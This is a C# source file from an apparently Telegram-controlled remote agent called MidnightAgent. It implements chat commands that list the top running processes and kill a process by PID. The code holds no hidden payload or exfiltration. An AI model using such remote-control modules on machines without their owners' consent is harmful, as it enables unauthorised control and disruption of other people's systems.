using System;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using MidnightAgent.Core;
using MidnightAgent.Telegram;

namespace MidnightAgent.Features
{
    /// <summary>
    /// /process - List running processes
    /// /killproc - Kill a process by PID
    /// </summary>
    public class ProcessFeature : IFeature
    {
        public string Command => "process";
        public string Description => "List running processes";
        public string Usage => "/process";

        public Task<FeatureResult> ExecuteAsync(string[] args)
        {
            try
            {
                Logger.Log("ProcessFeature: Getting processes...");
                
                var allProcesses = Process.GetProcesses();
                var processes = allProcesses
                    .Where(p => 
                    {
                        try { return p.WorkingSet64 > 0; }
                        catch { return false; }
                    })
                    .OrderByDescending(p => 
                    {
                        try { return p.WorkingSet64; }
                        catch { return 0; }
                    })
                    .Take(15) // Only top 15
                    .ToList();

                Logger.Log($"ProcessFeature: Found {processes.Count} processes");

                var sb = new StringBuilder();
                sb.AppendLine("📊 <b>Top Processes</b>");
                sb.AppendLine("");

                int count = 0;
                foreach (var proc in processes)
                {
                    try
                    {
                        long memMB = proc.WorkingSet64 / 1024 / 1024;
                        string name = proc.ProcessName;
                        if (name.Length > 20)
                            name = name.Substring(0, 17) + "...";
                        
                        sb.AppendLine($"{proc.Id} - {MessageHelper.EscapeHtml(name)} ({memMB}MB)");
                        count++;
                    }
                    catch 
                    {
                        // Skip this process
                    }
                }

                sb.AppendLine("");
                sb.AppendLine($"Showing {count}/{allProcesses.Length} processes");

                string message = sb.ToString();
                Logger.Log($"ProcessFeature: Message length={message.Length}");
                
                return Task.FromResult(FeatureResult.Ok(message));
            }
            catch (Exception ex)
            {
                Logger.Log($"ProcessFeature ERROR: {ex.Message}");
                return Task.FromResult(FeatureResult.Fail($"Error: {ex.Message}"));
            }
        }
    }

    /// <summary>
    /// /killproc - Kill process by PID
    /// </summary>
    public class KillProcessFeature : IFeature
    {
        public string Command => "killproc";
        public string Description => "Kill a process by PID";
        public string Usage => "/killproc <pid>";

        public Task<FeatureResult> ExecuteAsync(string[] args)
        {
            if (args.Length == 0)
            {
                return Task.FromResult(FeatureResult.Fail("Usage: /killproc <pid>"));
            }

            if (!int.TryParse(args[0], out int pid))
            {
                return Task.FromResult(FeatureResult.Fail("Invalid PID"));
            }

            try
            {
                var process = Process.GetProcessById(pid);
                string name = process.ProcessName;
                process.Kill();
                
                return Task.FromResult(FeatureResult.Ok($"✅ Killed process: {name} (PID: {pid})"));
            }
            catch (ArgumentException)
            {
                return Task.FromResult(FeatureResult.Fail($"Process with PID {pid} not found"));
            }
            catch (Exception ex)
            {
                return Task.FromResult(FeatureResult.Fail($"Failed to kill process: {ex.Message}"));
            }
        }
    }
}
